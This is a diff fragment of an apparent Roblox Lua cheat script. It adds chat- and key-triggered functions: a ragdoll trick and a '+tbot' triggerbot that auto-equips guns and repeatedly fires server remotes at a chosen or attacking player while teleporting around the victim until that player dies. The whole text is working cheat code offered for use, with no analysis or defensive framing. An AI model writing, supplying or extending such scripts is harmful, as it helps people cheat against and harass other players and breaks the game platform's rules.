+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
+wait()
+ 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
+wait()
+ 
+ 
+        game.Players.LocalPlayer.Character.Glock.Fire:FireServer(v.Character.Head.CFrame)
+end
+                end
+            end
+        end
+ 
+    end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+    
+if (string.lower(msg) == "+ragdoll") then
+    
+hu = game.Players.LocalPlayer.Character.Humanoid
+local l = Instance.new("Humanoid")
+l.Parent = game.Players.LocalPlayer.Character
+l.Name = "Humanoid"
+wait(0.1)
+hu.Parent = game.Players.LocalPlayer
+game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+wait(0.1)
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+end
+end)
+
+game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
+ if KeyPressed == "z" then
+local lplr = game:GetService("Players").LocalPlayer
+local Shotty = lplr.Backpack:FindFirstChild("Shotty")
+local Animation = Instance.new("Animation")
+Animation.AnimationId = "rbxassetid://503259904"
+local plr = game:GetService('Players').LocalPlayer
+local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
+Shotty.Equipped:connect(function()
+    wait(.1)
+    HUM:Play()
+    HUM:AdjustSpeed(0.0)
+end)
+Shotty.Unequipped:connect(function()
+    HUM:Stop()
+end)
+local lplr = game:GetService("Players").LocalPlayer
+local Glock = lplr.Backpack:FindFirstChild("Glock")
+local Animation = Instance.new("Animation")
+Animation.AnimationId = "rbxassetid://503259904"
+local plr = game:GetService('Players').LocalPlayer
+local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
+Glock.Equipped:connect(function()
+    wait(.1)
+    HUM:Play()
+    HUM:AdjustSpeed(0.0)
+end)
+Glock.Unequipped:connect(function()
+    HUM:Stop()
+end)
+end
+end)
+
+ 
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+    
+if (string.lower(msg) == "+tbot") then
+
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("[ [TRIGGERBOT] /aim <plr> - /stop","All")
+local following = false
+function psearch(arg)
+        for i,v in pairs(game.Players:GetPlayers()) do 
+                if string.lower(string.sub(v.Name,1,string.len(arg))) == string.lower(arg) then 
+                        return v
+                end
+        end
+end
+local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+for i,v in pairs(character:GetChildren()) do 
+        v.ChildAdded:Connect(function(s)
+                if s.Name == "creator" then
+                        local enemy = workspace:FindFirstChild(s.Value.Name)
+                        local enemyroot = enemy.Head
+                        following = true
+                        repeat
+                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Shotty') then game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character end
+                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Uzi') then game.Players.LocalPlayer.Backpack.Uzi.Parent = game.Players.LocalPlayer.Character end
+                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Glock') then game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character end
+                                if game.Players.LocalPlayer.Character:FindFirstChild("Shotty") then game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(enemyroot.CFrame) end
+                                if game.Players.LocalPlayer.Character:FindFirstChild("Glock") then game.Players.LocalPlayer.Character.Glock.Fire:FireServer(enemyroot.CFrame) end
+                                if game.Players.LocalPlayer.Character:FindFirstChild("Uzi") then game.Players.LocalPlayer.Character.Uzi.Fire:FireServer(enemyroot.CFrame) end
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(13,0,-3)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(4,0,-2)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,2)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(6,0,3)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,-6)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,-2)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(8,0,-2)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,-3)
+                                wait()
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,2)
+                        until enemy.Humanoid.Health == 0 or enemy:FindFirstChild("KO") or game.Players.LocalPlayer.Character.Humanoid.Health == 0 or following == false
+                end
+        end)
+end
+ 
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+        if string.lower(msg) == "/stop" then 
+                following = false
+        else
+                if msg:sub(1,5) == "/aim " then 
+                        local target = psearch(msg:sub(6))
+                        if target then 
+                                following = true
+                                repeat
+                                        if game.Players.LocalPlayer.Backpack:FindFirstChild('Shotty') then game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character end
+                                        if game.Players.LocalPlayer.Backpack:FindFirstChild('Glock') then game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character end
+                                        if game.Players.LocalPlayer.Character:FindFirstChild("Shotty") then game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(workspace[target.Name].Torso.CFrame) end
+                                        if game.Players.LocalPlayer.Character:FindFirstChild("Glock") then game.Players.LocalPlayer.Character.Glock.Fire:FireServer(workspace[target.Name].Torso.CFrame) end
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(1,0,-3)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(9,0,-2)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,2)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(12,0,3)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-13,0,-5)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-5,0,-2)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-4,-0,-2)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(6,0,-3)
+                                        wait()
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,2)
+                                until workspace[target.Name].Humanoid.Health == 0 or workspace[target.Name]:FindFirstChild("KO") or game.Players.LocalPlayer.Character.Humanoid.Health == 0 or following == false
+                        end
+                end
+        end
+end)
+end
+end)
